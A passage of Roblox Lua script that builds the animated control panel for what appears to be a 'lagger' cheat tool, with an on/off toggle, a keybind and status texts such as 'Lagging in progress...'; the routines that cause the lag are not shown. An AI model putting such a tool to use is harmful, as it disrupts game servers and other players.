        BackgroundTransparency = 0
    }):Play()

    -- Fade children back in
    fadeInChildren(Main, 0.2)
end

local function minimizeGUI()
    isMinimized = true
    -- Slide down and shrink
    TweenService:Create(Main, TweenInfo.new(0.4, Enum.EasingStyle.Quad, Enum.EasingDirection.In), {
        Size = UDim2.new(0, 340, 0, 90),
        Position = UDim2.new(0, Main.Position.X.Offset, 0, Main.Position.Y.Offset + 330)
    }):Play()

    -- Hide content
    for _, child in pairs(Content:GetDescendants()) do
        if child:IsA("TextLabel") or child:IsA("TextButton") then
            TweenService:Create(child, TweenInfo.new(0.2), {TextTransparency = 1}):Play()
        end
        if child:IsA("Frame") then
            TweenService:Create(child, TweenInfo.new(0.2), {BackgroundTransparency = 1}):Play()
        end
    end

    task.wait(0.4)
    Content.Visible = false
end

local function restoreGUI()
    isMinimized = false
    Content.Visible = true

    TweenService:Create(Main, TweenInfo.new(0.5, Enum.EasingStyle.Back, Enum.EasingDirection.Out), {
        Size = UDim2.new(0, 340, 0, 420),
        Position = UDim2.new(0, Main.Position.X.Offset, 0, Main.Position.Y.Offset - 330)
    }):Play()

    -- Fade content back
    for _, child in pairs(Content:GetDescendants()) do
        if child:IsA("TextLabel") or child:IsA("TextButton") then
            TweenService:Create(child, TweenInfo.new(0.4), {TextTransparency = 0}):Play()
        end
        if child:IsA("Frame") then
            local target = child.BackgroundTransparency - 0.3
            if target < 0 then target = 0 end
            TweenService:Create(child, TweenInfo.new(0.4), {BackgroundTransparency = target}):Play()
        end
    end
end

-- Button connections
CloseBtn.MouseButton1Click:Connect(function()
    closeGUI()
end)

MinBtn.MouseButton1Click:Connect(function()
    if isMinimized then
        restoreGUI()
    else
        minimizeGUI()
    end
end)

MinTabHit.MouseButton1Click:Connect(function()
    openGUI()
end)

-- ==================== LAGGER TOGGLE ====================

local pulseConnection = nil
local function startPulse()
    if pulseConnection then pulseConnection:Disconnect() end
    local scale = 1
    local growing = true
    pulseConnection = RunService.Heartbeat:Connect(function()
        if growing then
            scale = scale + 0.015
            if scale >= 1.4 then growing = false end
        else
            scale = scale - 0.015
            if scale <= 1 then growing = true end
        end
        StatusIconInner.Size = UDim2.new(0, 24 * scale, 0, 24 * scale)
        StatusIconInner.Position = UDim2.new(0.5, -12 * scale, 0.5, -12 * scale)
    end)
end

local function stopPulse()
    if pulseConnection then
        pulseConnection:Disconnect()
        pulseConnection = nil
    end
    StatusIconInner.Size = UDim2.new(0, 24, 0, 24)
    StatusIconInner.Position = UDim2.new(0.5, -12, 0.5, -12)
end

local function setLagger(state)
        laggerEnabled = state
        local twFast = TweenInfo.new(0.25, Enum.EasingStyle.Quad, Enum.EasingDirection.Out)
        local twBounce = TweenInfo.new(0.4, Enum.EasingStyle.Back, Enum.EasingDirection.Out)

        if laggerEnabled then
            -- Toggle ON
            TweenService:Create(ToggleSwitch, twFast, {BackgroundColor3 = Colors.ToggleOn}):Play()
            TweenService:Create(ToggleKnob, twBounce, {
                Position = UDim2.new(0, 29, 0.5, -12),
                BackgroundColor3 = Colors.White
            }):Play()

            -- Status updates
            StatusLabel.Text = "ACTIVE"
            StatusLabel.TextColor3 = Colors.HotPink
            StatusDesc.Text = "Lagging in progress..."
            StatusDesc.TextColor3 = Colors.BabyPinkDark

            -- Icon changes
            TweenService:Create(StatusIcon, TweenInfo.new(0.4), {
                BackgroundColor3 = Colors.ToggleOn
            }):Play()
            TweenService:Create(StatusIconInner, TweenInfo.new(0.4), {
                BackgroundColor3 = Colors.White
            }):Play()
            TweenService:Create(StatusIconStroke, TweenInfo.new(0.4), {
                Color = Colors.HotPink,
                Transparency = 0.1
            }):Play()

            -- Panel border
            TweenService:Create(StatusPanelStroke, TweenInfo.new(0.4), {
                Color = Colors.HotPink,
                Transparency = 0.2
            }):Play()

            -- Glow ring
            TweenService:Create(GlowRing, TweenInfo.new(0.5), {
                BackgroundTransparency = 0.85
            }):Play()

            startPulse()
            startLagger()
        else
            -- Toggle OFF
            TweenService:Create(ToggleSwitch, twFast, {BackgroundColor3 = Colors.ToggleOff}):Play()
            TweenService:Create(ToggleKnob, twBounce, {
                Position = UDim2.new(0, 3, 0.5, -12),
                BackgroundColor3 = Colors.White
            }):Play()

            -- Status updates
            StatusLabel.Text = "INACTIVE"
            StatusLabel.TextColor3 = Colors.TextMuted
            StatusDesc.Text = "Ready to lag"
            StatusDesc.TextColor3 = Colors.TextLight

            -- Icon reset
            TweenService:Create(StatusIcon, TweenInfo.new(0.4), {
                BackgroundColor3 = Colors.ToggleOff
            }):Play()
            TweenService:Create(StatusIconInner, TweenInfo.new(0.4), {
                BackgroundColor3 = Colors.TextLight
            }):Play()
            TweenService:Create(StatusIconStroke, TweenInfo.new(0.4), {
                Color = Colors.BabyPinkDark,
                Transparency = 0.4
            }):Play()

            -- Panel border reset
            TweenService:Create(StatusPanelStroke, TweenInfo.new(0.4), {
                Color = Colors.BabyPink,
                Transparency = 0.6
            }):Play()

            -- Glow ring fade
            TweenService:Create(GlowRing, TweenInfo.new(0.5), {
                BackgroundTransparency = 0.92
            }):Play()

            stopPulse()
            stopLaggerLoop()
        end
end

-- Toggle Click Handler
ToggleHit.MouseButton1Click:Connect(function()
    setLagger(not laggerEnabled)
end)

-- Keybind Handler
UserInputService.InputBegan:Connect(function(input, gpe)
    if input.KeyCode == toggleKey and not gpe then
        setLagger(not laggerEnabled)
    end
end)

-- Breathing glow animation
local breathing = true
task.spawn(function()
    while breathing do
        if not laggerEnabled then
            TweenService:Create(GlowRing, TweenInfo.new(4, Enum.EasingStyle.Sine, Enum.EasingDirection.InOut), {
                BackgroundTransparency = 0.88
            }):Play()
            task.wait(4)
            TweenService:Create(GlowRing, TweenInfo.new(4, Enum.EasingStyle.Sine, Enum.EasingDirection.InOut), {
                BackgroundTransparency = 0.95
            }):Play()
            task.wait(4)
        else
            task.wait(1)
        end
    end
end)
